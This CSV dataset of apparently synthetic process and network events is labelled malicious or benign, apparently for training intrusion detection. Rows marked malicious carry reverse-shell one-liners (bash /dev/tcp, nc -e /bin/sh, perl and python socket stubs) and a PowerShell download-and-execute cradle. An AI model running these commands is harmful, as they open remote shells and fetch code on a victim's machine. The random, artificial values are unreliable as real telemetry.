timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-02-22 23:18:44.819123,047203ea,init,svchost.exe,83.230.214.116,67.70.184.205,3389,UDP,3046,2088,36.18,dir,0
2025-03-22 17:46:45.434936,cfbaa1fa,systemd,explorer.exe,244.216.71.187,213.8.197.88,443,TCP,3597,886,25.49,ping,0
2025-03-02 15:43:46.295368,a94f62b9,svchost.exe,chrome.exe,29.138.240.33,116.36.128.217,8080,TCP,2104,1440,3.24,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-30 18:31:45.463842,3fc9e5f9,systemd,cmd.exe,80.19.223.159,220.250.71.129,8080,TCP,4543,811,51.0,ping,0
2025-04-19 18:31:46.102379,4f4429a1,systemd,nc,66.122.138.115,95.228.102.150,8080,TCP,1098,418,12.14,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-17 12:07:45.069644,205a0b9e,explorer.exe,perl,180.92.168.208,228.76.50.37,1337,UDP,2442,1813,44.41,ls,0
2025-03-29 12:15:45.122364,3c941fa8,svchost.exe,python.exe,16.36.194.109,124.21.82.63,1337,UDP,2624,2797,28.89,ping,0
2025-04-10 08:39:45.929640,23b71018,init,notepad.exe,64.102.184.35,99.98.111.31,4444,UDP,3994,3193,12.76,"python -c 'import socket,subprocess'",1
2025-04-27 15:46:45.963293,717bb2eb,explorer.exe,bash,4.4.159.53,175.170.230.120,22,UDP,785,815,35.78,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-25 14:18:46.221731,16fb4ca3,explorer.exe,notepad.exe,89.232.161.205,94.97.64.221,443,TCP,1730,2460,30.1,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-30 18:37:45.048253,557a6b77,explorer.exe,notepad.exe,28.110.227.77,113.13.96.157,1337,UDP,4554,4598,51.7,cd,0
2025-04-28 10:49:45.078242,78fc7666,systemd,explorer.exe,117.212.214.93,225.178.129.88,8080,TCP,3444,1958,53.24,ls,0
2025-04-01 17:47:45.027794,a466e922,systemd,chrome.exe,122.21.67.228,221.124.199.178,443,UDP,156,3997,56.63,ls,0
2025-03-05 14:52:44.866613,ff7a0dfc,init,svchost.exe,191.93.41.53,214.234.167.10,443,UDP,3171,1654,13.21,ipconfig,0
2025-03-30 22:48:45.467701,ef11b4cd,systemd,bash,106.37.75.188,129.9.219.84,22,TCP,2924,4831,50.64,cd,0
2025-02-21 16:57:45.151255,a5ae86af,svchost.exe,powershell,105.8.112.122,241.225.135.70,4444,UDP,2192,751,7.45,ls,0
2025-03-25 09:52:46.094650,9e934eeb,systemd,chrome.exe,195.15.55.226,85.123.212.251,443,TCP,1746,1567,16.62,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-13 16:36:45.323984,a0a4270a,systemd,notepad.exe,237.53.76.27,171.143.208.114,4444,TCP,2388,1810,20.97,cd,0
2025-04-07 10:58:45.587704,c8df6c47,systemd,perl,59.233.151.247,225.121.210.56,22,TCP,3216,2426,56.55,ipconfig,0
2025-04-25 00:56:44.876606,e5eaca60,explorer.exe,cmd.exe,29.188.244.119,167.179.98.100,22,UDP,2635,3471,32.93,ls,0
2025-03-03 22:01:45.695383,171363be,init,perl,62.246.169.73,201.144.183.47,3389,TCP,3349,3475,9.67,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-23 23:29:45.695173,e239352d,systemd,nc,50.172.192.38,84.237.171.200,443,UDP,3826,858,30.36,"python -c 'import socket,subprocess'",1
2025-03-17 08:11:45.007070,51ca3a09,init,cmd.exe,158.115.161.171,60.72.79.233,4444,UDP,1766,2462,23.04,cd,0
2025-04-06 09:26:45.746754,f28d6b51,svchost.exe,explorer.exe,250.151.245.32,153.96.15.81,3389,UDP,758,4649,52.64,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-20 06:40:46.273677,a123fc52,explorer.exe,bash,129.235.103.23,158.194.204.77,3389,UDP,1965,2043,7.04,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-10 08:45:45.775304,0800fa67,svchost.exe,nc,214.150.46.64,105.206.238.133,3389,UDP,902,4392,10.04,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-26 07:38:46.102050,698831fd,explorer.exe,powershell,94.171.30.170,92.42.186.191,4444,TCP,1586,3534,5.44,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-26 01:32:45.789330,38bc44bb,systemd,bash,39.108.71.153,77.166.37.19,443,UDP,4839,1692,14.47,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-15 04:38:46.035711,82746450,systemd,perl,214.208.95.7,126.111.173.170,22,UDP,2813,3443,50.26,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-20 16:57:45.563772,341d60a0,init,powershell,47.153.176.251,234.69.26.40,1337,UDP,3701,3107,49.78,dir,0
2025-04-18 20:00:45.777723,bfdcf224,explorer.exe,powershell,53.94.20.123,57.35.16.156,443,TCP,3733,796,10.72,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-22 16:45:45.911448,cd4583c4,svchost.exe,cmd.exe,197.221.85.112,192.87.216.133,443,TCP,4481,3762,30.04,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-27 09:49:44.911140,ad2154c5,explorer.exe,explorer.exe,76.220.230.121,242.117.34.68,1337,UDP,2294,3988,9.11,ipconfig,0
2025-04-29 16:58:45.433299,d6f86e28,svchost.exe,svchost.exe,8.168.73.220,213.31.180.34,4444,TCP,4345,2631,45.87,cd,0
2025-03-15 10:35:45.900822,0e0cb99e,systemd,bash,46.64.33.232,210.173.229.167,3389,UDP,2018,3872,16.41,"python -c 'import socket,subprocess'",1
2025-03-19 02:29:45.467385,7e5f982a,systemd,python.exe,83.15.174.51,176.109.12.79,1337,UDP,3107,4281,52.95,ping,0
2025-03-05 08:18:45.839492,a33548ee,svchost.exe,perl,198.18.87.19,9.192.98.105,22,TCP,2870,4540,14.5,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-03 12:01:46.158222,554887f5,systemd,notepad.exe,92.185.126.235,56.30.147.196,22,UDP,4765,2468,45.48,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-14 16:30:45.599079,d2fae1f5,systemd,bash,162.40.66.189,78.45.193.85,22,UDP,324,2056,32.69,ipconfig,0
2025-03-30 23:01:46.161420,b962c161,init,explorer.exe,176.153.139.160,219.142.97.52,1337,UDP,3549,4540,17.53,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-25 17:43:44.775121,27c19df1,svchost.exe,nc,74.212.237.116,41.237.224.46,8080,UDP,77,4413,49.81,cd,0
2025-04-03 16:10:45.189138,04e5c4da,systemd,cmd.exe,244.209.58.198,54.127.138.229,1337,TCP,2243,4432,34.98,cd,0
2025-03-08 16:40:45.742015,835c769f,explorer.exe,python.exe,158.152.208.44,53.179.45.207,443,UDP,3845,4563,43.63,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-05 20:41:46.089952,525cc78c,explorer.exe,powershell,104.66.56.55,242.133.105.163,22,UDP,2965,1749,30.68,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-07 03:34:44.825343,a550108d,systemd,explorer.exe,187.208.150.244,92.64.112.193,8080,UDP,2036,2316,39.75,ipconfig,0
2025-03-20 20:17:44.850175,768470e9,explorer.exe,nc,154.69.203.14,117.186.69.7,443,TCP,3734,2225,15.57,ipconfig,0
2025-03-19 11:05:44.893431,c2a80154,svchost.exe,python.exe,87.143.154.41,40.57.178.95,4444,TCP,4529,2697,33.43,dir,0
2025-03-10 03:48:46.017219,c5a51ee6,init,explorer.exe,249.199.145.109,49.36.90.47,4444,UDP,1890,1176,12.33,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-17 08:34:46.218333,643702a1,systemd,perl,75.39.191.75,231.214.139.67,1337,UDP,252,554,13.95,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-19 13:11:46.207604,25ebb779,svchost.exe,python.exe,15.107.179.68,216.56.112.107,4444,TCP,4810,4123,23.54,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-13 07:54:44.879056,82ee29d4,systemd,nc,247.15.187.175,70.120.46.50,1337,TCP,2125,2109,52.53,cd,0
2025-04-27 13:04:45.247438,773ee4fb,explorer.exe,svchost.exe,175.22.159.223,114.252.206.253,8080,UDP,2348,3344,28.77,dir,0
2025-03-03 10:22:44.816054,0ae164cb,svchost.exe,explorer.exe,34.236.194.76,63.97.82.35,1337,UDP,394,2933,21.36,cd,0
2025-03-22 22:07:45.091996,80d970de,svchost.exe,chrome.exe,82.59.159.97,126.29.141.250,443,TCP,1814,4869,19.76,dir,0
2025-04-24 04:32:45.477643,611bc5fc,systemd,svchost.exe,201.33.116.190,93.22.160.219,443,UDP,2789,4278,43.58,ping,0
2025-05-01 07:50:45.506408,1e1feb15,systemd,cmd.exe,49.140.143.40,179.22.128.204,22,UDP,3021,433,20.89,cd,0
2025-03-23 03:23:44.945147,82fef274,init,cmd.exe,95.91.231.153,244.216.14.53,8080,UDP,1895,2958,59.94,ping,0
2025-04-25 09:36:44.857906,63f2128d,systemd,svchost.exe,77.214.233.96,126.76.182.76,4444,TCP,541,1725,2.52,ls,0
2025-04-11 09:54:45.897571,d09e1299,svchost.exe,explorer.exe,214.91.139.120,107.67.97.136,1337,UDP,165,589,45.27,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-13 08:18:45.789026,e0aa0c01,svchost.exe,explorer.exe,121.118.182.66,75.48.81.34,443,TCP,4510,1328,21.06,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-23 04:37:45.272497,3d3f299e,init,perl,50.8.200.219,55.24.95.134,4444,TCP,2837,3424,4.02,ping,0
2025-04-15 21:32:45.237786,fb10d6b5,systemd,bash,179.228.126.31,182.50.212.233,1337,UDP,4197,4591,6.23,ping,0
2025-03-25 05:37:45.498818,cec97a47,explorer.exe,explorer.exe,218.53.43.26,181.166.159.48,22,TCP,2925,4861,10.73,ipconfig,0
2025-04-12 23:20:45.020076,b2c644ac,init,nc,4.57.162.62,192.30.90.101,8080,UDP,127,2836,11.68,ls,0
2025-03-01 17:50:45.719903,101116dc,systemd,explorer.exe,41.156.155.9,233.30.232.189,8080,UDP,2306,4206,21.68,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-17 21:37:44.932904,52838838,svchost.exe,svchost.exe,112.144.253.193,16.186.161.251,8080,TCP,1995,362,18.69,dir,0
2025-03-30 09:24:45.802391,15a9e3c6,explorer.exe,cmd.exe,3.33.213.19,72.115.51.172,22,UDP,3014,2510,12.6,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-28 05:11:46.097226,b8849c13,explorer.exe,cmd.exe,254.167.113.119,148.238.216.167,4444,UDP,3458,1495,43.09,"python -c 'import socket,subprocess'",1
2025-02-23 09:02:45.487138,fa776265,init,explorer.exe,239.80.114.135,137.230.48.12,22,UDP,2144,1902,18.37,cd,0
2025-03-06 15:46:45.163101,953a1fa9,systemd,cmd.exe,154.71.229.213,141.179.69.15,443,TCP,1929,2067,31.3,cd,0
2025-02-26 19:44:46.136289,b5f8ee46,explorer.exe,nc,96.208.136.231,96.10.225.90,4444,UDP,1073,3733,0.89,"python -c 'import socket,subprocess'",1
2025-04-13 15:16:46.059967,4d262d98,svchost.exe,notepad.exe,171.250.205.211,26.125.143.178,3389,TCP,1629,1872,56.33,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-25 14:54:46.342323,fcfe8ae5,init,powershell,124.146.214.131,252.32.33.1,4444,TCP,2875,3618,25.8,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-14 02:27:45.775688,45d68645,init,perl,155.202.185.42,75.247.16.85,1337,TCP,2917,674,25.38,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-27 07:12:46.039792,24a99d15,svchost.exe,explorer.exe,145.159.5.10,114.179.59.217,8080,UDP,2271,3197,56.96,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-01 04:44:45.755628,5e97426f,explorer.exe,svchost.exe,86.36.222.222,243.138.96.182,3389,UDP,2681,2678,56.08,"python -c 'import socket,subprocess'",1
2025-04-01 17:43:45.233014,dbf8da09,explorer.exe,perl,201.241.81.231,5.204.145.35,4444,TCP,880,2572,46.59,ipconfig,0
2025-03-10 10:47:46.088618,b444ffd0,svchost.exe,powershell,40.177.91.123,130.204.225.121,22,UDP,4205,280,28.41,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-27 05:46:44.792708,c582cbe0,systemd,powershell,214.181.86.149,61.69.204.10,22,UDP,1771,3281,18.52,ping,0
2025-03-16 06:22:45.731464,e117c9d7,init,cmd.exe,6.100.129.113,55.34.137.87,3389,UDP,2291,3522,55.1,"python -c 'import socket,subprocess'",1
2025-04-22 21:05:45.313789,80f1021f,svchost.exe,notepad.exe,85.230.128.224,224.143.35.2,443,UDP,4509,150,37.57,cd,0
2025-04-28 11:19:45.459501,5a858903,systemd,explorer.exe,180.245.209.104,121.206.56.162,3389,TCP,4945,4056,53.6,ping,0
2025-03-21 20:49:44.794016,cec3b039,systemd,python.exe,170.191.237.136,195.113.239.64,443,TCP,353,2455,34.36,cd,0
2025-04-20 19:09:46.258651,45fb0c37,explorer.exe,notepad.exe,149.81.108.232,2.215.160.17,22,TCP,603,3050,39.11,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-04 01:02:44.825062,b9a76c60,init,chrome.exe,222.110.211.149,169.51.63.237,1337,TCP,3099,2206,10.83,ls,0
2025-03-13 05:11:46.278307,ce217fee,init,notepad.exe,196.30.210.221,99.222.53.117,1337,TCP,1530,4902,1.36,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-23 01:13:44.855837,21373af9,systemd,notepad.exe,118.240.200.252,157.197.59.223,8080,UDP,3289,4747,46.31,ipconfig,0
2025-04-25 17:06:45.999042,93e43e31,explorer.exe,nc,126.177.125.34,5.63.210.236,4444,UDP,4198,4485,11.07,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-01 15:54:45.194494,4c840b4e,explorer.exe,explorer.exe,120.143.241.198,109.25.202.184,443,TCP,4393,2727,30.87,ping,0
2025-02-26 16:12:46.018776,0ac095e7,systemd,nc,91.216.158.93,1.89.101.72,4444,UDP,4149,1557,21.74,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-29 07:19:46.087039,9bce2d3a,svchost.exe,explorer.exe,116.188.202.68,26.65.208.176,8080,UDP,3155,4780,46.01,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-22 15:24:46.060116,767028b2,svchost.exe,perl,183.15.180.48,38.44.162.213,8080,UDP,318,1734,2.4,"python -c 'import socket,subprocess'",1
2025-04-24 17:38:45.544301,ace213a0,systemd,notepad.exe,218.160.217.169,213.58.176.224,4444,UDP,4381,3970,46.31,ping,0
2025-03-13 08:43:45.394003,0248b3e3,svchost.exe,chrome.exe,214.147.129.149,229.149.143.105,1337,TCP,1053,398,26.62,cd,0
2025-03-22 08:05:45.949751,4c52e898,svchost.exe,python.exe,189.155.11.30,205.250.55.141,4444,UDP,4609,2461,52.64,"python -c 'import socket,subprocess'",1
2025-03-29 16:15:45.616903,d0570293,explorer.exe,python.exe,252.30.144.92,78.105.220.83,8080,TCP,1369,156,40.26,ipconfig,0
2025-03-25 12:34:45.921542,9dfa2c36,explorer.exe,powershell,59.131.77.190,161.147.133.158,3389,TCP,969,2200,14.35,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-07 16:27:44.942218,14a0bc56,explorer.exe,python.exe,154.189.70.44,23.5.184.77,443,TCP,4219,2461,48.84,ipconfig,0
2025-04-04 14:33:45.167309,29fedb53,svchost.exe,bash,45.55.101.37,40.134.132.39,1337,UDP,518,3853,7.44,ping,0
2025-03-20 15:59:46.218804,ae5c4705,init,bash,211.59.100.203,16.88.128.136,8080,UDP,4462,3036,0.92,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-04 05:58:46.191508,73676ed1,svchost.exe,powershell,39.128.146.96,145.244.40.115,22,TCP,4181,4643,12.19,"python -c 'import socket,subprocess'",1
2025-03-29 22:08:45.929277,2e5c9313,svchost.exe,cmd.exe,253.229.22.114,139.9.209.68,3389,TCP,3581,3167,19.81,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-07 16:55:45.811667,9492fbf4,systemd,notepad.exe,57.190.227.59,112.70.223.39,1337,UDP,377,3296,35.72,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-03 02:21:45.770736,c7156784,svchost.exe,notepad.exe,136.209.35.202,100.106.249.115,8080,UDP,4012,4424,22.03,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-27 22:59:45.309467,c81d8a9f,systemd,chrome.exe,170.78.250.137,253.250.29.137,443,TCP,1741,4683,51.87,ls,0
2025-03-08 05:37:46.269185,8f5d6e04,init,notepad.exe,40.180.28.215,166.219.185.40,8080,UDP,661,4872,33.29,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-24 06:05:45.360318,e66f157d,init,perl,39.121.223.215,202.201.76.26,8080,TCP,3031,711,13.4,cd,0
2025-04-23 00:32:46.129233,a24dbfb4,systemd,explorer.exe,54.65.220.124,124.102.89.36,22,TCP,3727,1306,31.05,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-23 17:52:45.942576,123c78cf,systemd,notepad.exe,236.47.154.188,46.228.171.120,22,TCP,2148,2600,42.56,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-25 20:21:45.638981,437f93d8,init,bash,13.166.72.134,52.59.221.65,1337,TCP,2389,4434,17.99,ipconfig,0
2025-02-26 10:54:44.925884,19112f08,systemd,cmd.exe,159.166.252.175,74.201.124.174,22,TCP,1159,2875,7.05,dir,0
2025-04-05 12:35:45.069869,012161e1,init,python.exe,74.229.172.2,228.158.78.108,22,UDP,2318,3058,19.22,ls,0
2025-03-24 17:17:45.877241,f7f0dbfe,systemd,explorer.exe,122.50.184.57,115.79.10.115,8080,TCP,678,1365,5.06,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-28 22:04:46.145768,f806bc0d,systemd,explorer.exe,105.218.153.111,134.234.44.174,8080,TCP,2133,4954,0.42,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-13 17:57:44.925259,31c15abe,svchost.exe,powershell,40.140.249.102,222.135.189.123,1337,TCP,1316,468,54.51,ls,0
2025-02-28 13:24:45.390111,5ad18ae0,svchost.exe,chrome.exe,11.176.54.110,119.253.133.134,1337,UDP,112,1011,51.35,ping,0
2025-02-28 05:10:45.955905,390aa2aa,explorer.exe,nc,142.90.210.217,247.132.244.2,8080,TCP,4597,826,29.9,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-22 14:47:46.308020,7309babf,systemd,powershell,95.61.137.193,38.198.254.156,443,TCP,176,872,29.63,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-25 17:14:45.853285,04c936b4,init,notepad.exe,71.164.172.242,80.175.156.152,8080,UDP,4621,539,27.89,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-23 22:11:44.833745,11b16683,systemd,svchost.exe,155.214.111.62,6.203.217.61,3389,UDP,654,3620,44.71,dir,0
2025-03-13 04:57:45.150834,90677e57,systemd,svchost.exe,48.66.112.238,213.168.92.51,1337,TCP,4037,1311,44.49,ls,0
2025-04-05 02:12:44.952664,4c29b500,systemd,explorer.exe,180.249.3.57,156.140.128.129,1337,TCP,3491,2399,25.48,ping,0
2025-03-12 11:42:44.973253,41d1582d,systemd,explorer.exe,221.252.144.219,13.131.45.6,1337,UDP,4164,85,35.68,ipconfig,0
2025-04-02 15:24:45.423805,6fbe6ac1,systemd,explorer.exe,199.8.185.194,158.26.208.9,1337,UDP,2949,2550,12.76,ping,0
2025-03-10 20:37:45.437692,374a5e4f,explorer.exe,explorer.exe,9.135.22.28,89.76.208.36,3389,UDP,1673,4922,42.6,cd,0
2025-04-20 23:02:45.912715,2b54e918,explorer.exe,python.exe,63.94.125.220,248.97.199.183,3389,TCP,4510,261,16.48,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-22 14:04:45.853475,26d36904,systemd,notepad.exe,127.62.167.219,120.19.214.80,1337,TCP,561,4778,52.24,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-25 09:48:45.643438,9333896f,explorer.exe,notepad.exe,216.242.34.64,59.182.97.128,4444,TCP,3221,2052,44.78,ping,0
2025-02-26 01:34:45.537177,81a3b774,systemd,python.exe,127.191.152.31,190.30.26.233,1337,UDP,2268,3602,41.15,ls,0
2025-03-08 05:40:45.248591,5a8a9daf,init,chrome.exe,197.177.250.72,229.39.190.174,443,UDP,1562,4158,35.12,cd,0
2025-04-22 13:33:44.749093,9619a928,systemd,notepad.exe,186.10.118.100,183.222.134.30,22,UDP,410,4918,52.33,ping,0
2025-03-12 20:29:45.309855,81378109,systemd,chrome.exe,160.202.16.76,97.235.160.147,4444,TCP,4684,3564,36.27,ipconfig,0
2025-03-21 11:13:44.922188,c9ba9d5f,explorer.exe,python.exe,223.108.41.172,82.174.192.97,1337,UDP,79,1763,54.74,cd,0
2025-04-03 17:55:45.326316,bb3df12d,systemd,explorer.exe,173.206.43.203,122.60.195.48,443,TCP,2054,4887,45.94,ping,0
2025-03-19 22:32:46.366020,31cbeb4a,explorer.exe,perl,197.28.72.49,146.223.229.161,443,UDP,2850,516,28.15,"python -c 'import socket,subprocess'",1
2025-04-04 05:55:45.632044,a74d2b20,svchost.exe,perl,68.244.205.204,117.204.70.127,4444,TCP,3392,3989,39.49,cd,0
2025-04-10 08:20:45.249107,892c5113,svchost.exe,perl,18.5.10.88,224.117.156.112,4444,TCP,2178,2578,4.36,ping,0
2025-03-11 02:40:45.724051,202f6206,svchost.exe,nc,164.78.248.31,99.84.214.216,8080,UDP,4694,4873,21.71,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-17 16:46:44.922640,918cdada,explorer.exe,svchost.exe,207.190.99.225,97.183.179.69,443,TCP,4554,3144,1.55,ping,0
2025-02-22 14:42:45.090842,bbf0b441,systemd,python.exe,172.229.250.245,238.29.198.170,1337,TCP,2321,2640,29.61,ping,0
2025-02-25 18:29:44.805932,f721851c,explorer.exe,powershell,40.223.112.140,107.138.128.254,8080,UDP,119,901,45.84,dir,0
2025-03-10 17:34:46.038670,c1994afa,explorer.exe,powershell,36.237.31.200,83.145.225.134,8080,UDP,2071,4597,26.44,"python -c 'import socket,subprocess'",1
2025-03-08 19:32:45.850403,e51249c2,svchost.exe,cmd.exe,206.145.153.17,180.35.12.93,1337,UDP,3593,2007,8.57,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-06 04:11:45.799606,c2b081ba,explorer.exe,python.exe,18.163.144.224,124.6.155.6,443,TCP,518,897,16.53,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-26 00:54:45.130548,0ae5d265,systemd,perl,109.25.19.231,231.195.171.113,22,TCP,3250,407,54.75,ls,0
2025-04-02 12:07:46.379024,4c5e0a52,svchost.exe,notepad.exe,156.45.182.213,93.217.65.151,22,TCP,3811,223,54.01,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-07 22:53:45.916783,ed96e6c7,init,notepad.exe,113.232.223.64,105.177.224.99,4444,UDP,3653,1478,0.26,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-08 07:45:45.058663,c3ac385a,explorer.exe,bash,155.216.32.120,251.42.243.4,8080,TCP,2075,3616,42.17,ipconfig,0
2025-02-22 09:37:44.872832,eecc2c30,systemd,chrome.exe,231.95.150.86,87.26.51.210,443,TCP,2732,601,21.13,dir,0
2025-04-24 04:53:46.011328,29f44c80,init,svchost.exe,176.1.7.25,205.188.35.87,443,UDP,833,2962,35.54,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-14 01:40:45.368683,cb109dd6,systemd,python.exe,180.150.131.201,170.185.126.109,4444,TCP,205,3913,2.11,dir,0
2025-04-12 22:09:45.920110,0e30e9a7,systemd,notepad.exe,176.5.182.107,249.176.220.171,3389,UDP,4635,3224,17.98,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-22 08:21:46.370560,f403945f,svchost.exe,cmd.exe,203.170.241.17,83.18.232.239,443,UDP,4621,800,39.13,"python -c 'import socket,subprocess'",1
2025-04-28 16:17:45.998356,80a43cb0,svchost.exe,powershell,119.175.171.124,30.87.99.48,4444,TCP,132,2499,53.05,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-25 06:54:45.249016,6009f51d,init,perl,127.250.180.210,181.240.128.81,1337,TCP,3821,2070,32.04,ls,0
2025-04-10 03:09:44.853799,a026483b,svchost.exe,bash,179.63.14.183,233.230.146.3,1337,TCP,3902,1993,29.84,ping,0
2025-03-06 16:59:44.746824,2b5f4242,explorer.exe,python.exe,105.165.83.29,25.134.169.18,22,TCP,1513,306,12.2,cd,0
2025-04-16 14:57:44.926304,548c728d,systemd,perl,135.241.27.171,49.64.227.239,1337,TCP,2415,677,37.0,ipconfig,0
2025-04-17 02:14:44.884881,cde2af8b,svchost.exe,python.exe,149.132.72.87,3.50.52.251,1337,UDP,453,1467,40.1,ipconfig,0
2025-04-15 04:02:44.774074,6815009d,systemd,bash,175.133.214.28,120.207.22.89,1337,TCP,3363,150,9.74,ls,0
2025-04-25 08:10:46.123876,ab3b711e,svchost.exe,cmd.exe,49.145.200.140,136.192.73.237,1337,TCP,452,170,44.75,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-06 03:32:45.122292,d2982e0c,init,chrome.exe,94.117.59.128,163.137.44.31,22,UDP,3371,3813,43.45,ls,0
2025-03-24 04:17:44.732774,719c170a,explorer.exe,nc,201.20.93.65,242.64.185.161,8080,TCP,3800,926,8.22,dir,0
2025-03-04 18:39:45.983755,281cf818,svchost.exe,cmd.exe,67.138.74.39,199.166.134.11,1337,UDP,4306,1933,8.04,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-22 07:40:45.340016,4e3d19ef,init,notepad.exe,33.15.146.69,18.18.128.100,443,TCP,1557,544,35.9,dir,0
2025-04-29 06:48:45.551105,0945f061,svchost.exe,notepad.exe,249.77.229.214,73.181.137.23,443,TCP,2243,764,53.71,ping,0
2025-04-06 19:19:45.549246,4cdee443,svchost.exe,notepad.exe,21.221.50.95,122.228.159.71,4444,TCP,4286,4355,27.7,ls,0
